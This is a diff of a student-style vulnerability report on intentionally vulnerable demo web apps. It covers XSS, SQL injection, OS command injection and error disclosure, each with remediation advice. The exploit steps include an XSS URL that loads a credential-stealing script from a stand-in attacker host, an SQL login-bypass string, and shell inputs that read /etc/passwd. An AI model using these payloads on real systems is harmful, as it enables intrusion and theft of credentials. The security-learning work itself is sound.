@@ -8,9 +8,9 @@ Cross-site Scripting (XSS) is an attack technique that involves echoing attacker
 
 It attacks confidentiality and integrity as unauthorized user can get password from users’ session to log in and then read and write data.
 
-Interception, modification and fabrication can exploit this vulnerability. The attacker may gain access to users cookies, session IDs, passwords, private messages etc. They can read and access the content of a page for any attacked user and therefore all the informations displayed to the user. The attacker may also compromise the content shown to the user. 
+Interception, modification and fabrication can exploit this vulnerability. The attacker may gain access to users or administrator cookies, session IDs, passwords, private messages etc. They can read and access the content of a page for any attacked user (interception), modify users’ information such as password and add new user accounts(fabrication).
 
-If attacker didn’t get user’s username and password from the session, then it is passive as it is eavesdropping users’ activity. If attacker get user’s username and password from the session, then it is active as the attacker log in as a different user to read and write data.
+If attacker didn’t get user’s username and password from the session, then it is passive as the attacker eavesdrops users’ activity. If attacker get user’s username and password from the session, then it is active as the attacker log in as a different user to read and write data.
 
 Business value would be lost: Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site, and the company will lose its reputation. If attacker get password of administrator, then it will cause data loss and unauthorized access.
 
@@ -20,10 +20,11 @@ Business value would be lost: Cross-site Scripting attacks essentially compromis
    3. Use testing tools extensively during the design phase to eliminate such XSS holes in the application before it goes into use.
 
 
-The URL of the website with the described vulnerability: http://demo.testfire.net/
+### 1.3 The URL of the website with the described vulnerability
+     http://demo.testfire.net/
 
 
-###### Steps taken to exploit the vulnerability:
+### 1.4 Steps taken to exploit the vulnerability:
    1. Attacker observes that http://demo.testfire.net/ website contains a reflected XSS vulnerability: User can input a search term in the search box and clicks the submit button and the url will be http://demo.testfire.net/search.aspx?txtSearch=***
    2. The attacker crafts a URL to exploit the vulnerability by making the URL http://demo.testfire.net/search.aspx?txtSearch=searchitem<script%20src="http://mallorysevilsite.com/authstealer.js"></script> which will run the js file to grab users’ information. Then attacker encodes this URL to http://demo.testfire.net/search.aspx?txtSearch=searchitem%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E, so that user cannot immediately decipher the malicious URL.
    3. Attacker sends the link to some unsuspecting members of this website. When user clicks on the link, it goes to the website to search, right in the middle, the script tag runs (it is invisible on the screen) and loads and runs authstealer.js (triggering the XSS attack). 
@@ -39,6 +40,8 @@ The screenshot follows the steps of what OWASP ZAP does
 
 
 ## Vulnerability 2:  SQL Injection
+
+### 2.1 Vulnerability description
 The vulnerability is detected by successfully retrieving more data than originally returned, by manipulating the parameter
 
 It attacks confidentiality and integrity because attackers which is unauthorized user can log in admin account to read and write data. 
@@ -50,15 +53,16 @@ Attacks that exploit this vulnerability is active because attacker log in as adm
 
 Business value would be lost:Exploiting this vulnerability would due to data loss and unauthorized access. When attacker is able to log in as an administrator, customers’ information are stolen which will affect public image of the company and result in noticeable profit loss. 
 
-#### Steps for development team taken to fix this vulnerability:
+### 2.2 Steps for development team taken to fix this vulnerability:
   1. Adopt an input validation technique in which user input is authenticated against a set of defined rules for length, type and syntax and also against business rules.
   2. Development team should ensure that users with the permission to access the database have the least privileges. Additionally, avoid using the 'sa' or 'db-owner' database users. This does not eliminate SQL injection, but minimizes its impact.
   3. Also, you should always make sure that a database user is created only for a specific application and this user is not able to access other applications. 
   4. Remove all stored procedures that are not in use. Use strongly typed parameterized query APIs with placeholder substitution markers, even when calling stored procedures. Show care when using stored procedures since they are generally safe from injection. However, be careful as they can be injectable (such as via the use of exec() or concatenating arguments within the stored procedure).
 
-The URL of the website with the described vulnerability: http://demo.testfire.net/bank/login.aspx
+### 2.3 The URL of the website with the described vulnerability
+     http://demo.testfire.net/bank/login.aspx
 
-###### Steps taken to exploit the vulnerability.
+### 2.4 Steps taken to exploit the vulnerability.
 1. Go to login page of the website http://demo.testfire.net/bank/login.aspx
 2. Type “ZAP” as username, “ZAP' OR '1'='1' --” as password.
 3. Successfully log in as administrator to view and edit users’ information.
@@ -70,8 +74,9 @@ A screenshot of the vulnerability.
 
 
 
-Vulnerability 3: Remote OS command injection
+## Vulnerability 3: Remote OS command injection
 
+### 3.1 Vulnerability description
 Remote OS command injection is an attack technique that user can supply operating system commands through a web interface in order to execute OS commands on a web server. This vulnerability can seduce attack on the confidentiality and integrity of system as an attacker can inject extra shell commands and have the application run them under the privileges of the web-server, and these commands can achieve unauthorized read and write. 
 
 Interruption: Injection code to disrupt services of a host connected to the Internet, resulting in Denial-of-service attack. 
@@ -82,20 +87,19 @@ Referring to the aforementioned ways of exploiting this vulnerability, we can se
 Business value would be lost: Reputation damage would occur if user data is modified or deleted by attacker through os command injection. Moreover, all data could be stolen by attacker, where resides business value, which would incur financial damage.   
 
 
-#### Steps for development team taken to fix this vulnerability:
-
+### 3.2 Steps for development team taken to fix this vulnerability:
 1. Perform input validation by considering all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. When constructing OS command strings, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. 
 
 2. Proper output encoding, escaping, and quoting, which can effectively limits what will appear in the output,  is the most effective solution for preventing OS command injection. Although input validation may provide some defense-in-depth. It will not always prevent OS command injection, especially if the application is required to support free-form text fields that could contain arbitrary characters. In this case, stripping the character might reduce the risk of OS command injection, but it would produce incorrect behavior because the subject field would not be recorded as the user intended.
 
 3. Apart from dealing with the input and output carefully, development team can make the code run in a sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by your software. For any data that will be used to generate a command to be executed, keep as much of that data out of external control as possible. 
-The URL of the website with the described vulnerability. http://www.webscantest.com/osrun/whois.php   
 
-
-
-###### Steps taken to exploit the vulnerability
-(1). Enter the URL provided above
-(2).  Enter any of the following unix command below,  they can all be executed under the privileges of the web-server
+### 3.3 The URL of the website with the described vulnerability
+     http://www.webscantest.com/osrun/whois.php   
+     
+### 3.4 Steps taken to exploit the vulnerability
+  1. Enter the URL provided above
+  2. Enter any of the following unix command below,  they can all be executed under the privileges of the web-server
   ;cat /proc/cpuinfo
   ;cat /etc/passwd
   ;cat id
@@ -116,9 +120,8 @@ Result as follow is obtained
 <img width="1338" alt="os4" src="https://cloud.githubusercontent.com/assets/16599342/20375525/a78fcb20-ac4d-11e6-9d81-4c195ac99555.png">
 
 
-
 ## Vulnerability 4:  Application Error Disclosure
-
+### 4.1 Vulnerability description
 Web applications will often leak information about their internal state through detailed or debug error messages. This vulnerability attack confidentiality because the application error disclosure reveal sensitive information like the location of the file that produced the unhandled exception which unauthorized user should not know. 
 
 This error  information can be leveraged to launch or even automate more powerful attacks. Depending on what kind of information the attacker finally obtained by exploring this vulnerability,  interception attack or even modification is possible.
@@ -127,13 +130,13 @@ The attacks that exploit this vulnerability are passive, because attacker mainly
 
 Business value would be lost : Organization is exposed to the risk of leaking out important information or even classified information. For example, if an important  research outcome is leaked out,  company will suffer from financial damage. Privacy violation is of high probability. 
 
-Steps for development team taken to fix this vulnerability:
-Implement a mechanism to provide a unique error reference/identifier to the client while logging the details on the server side and not exposing them to the user.
+### 4.2 Steps for development team taken to fix this vulnerability:
+  1. Implement a mechanism to provide a unique error reference/identifier to the client while logging the details on the server side and not exposing them to the user.
  
-The URL of the website with the described vulnerability.
-http://demo.testfire.net/default.aspx?content=personal_savings.htm 
+### 4.3 The URL of the website with the described vulnerability:
+     http://demo.testfire.net/default.aspx?content=personal_savings.htm 
 
-###### Steps taken to exploit the vulnerability.
+### 4.4 Steps taken to exploit the vulnerability.
 1. Assume username and password of administrator are leaked through error message
 2. The attacker login in using the leaked information
 3.  Attacker can then manipulate the website information easily
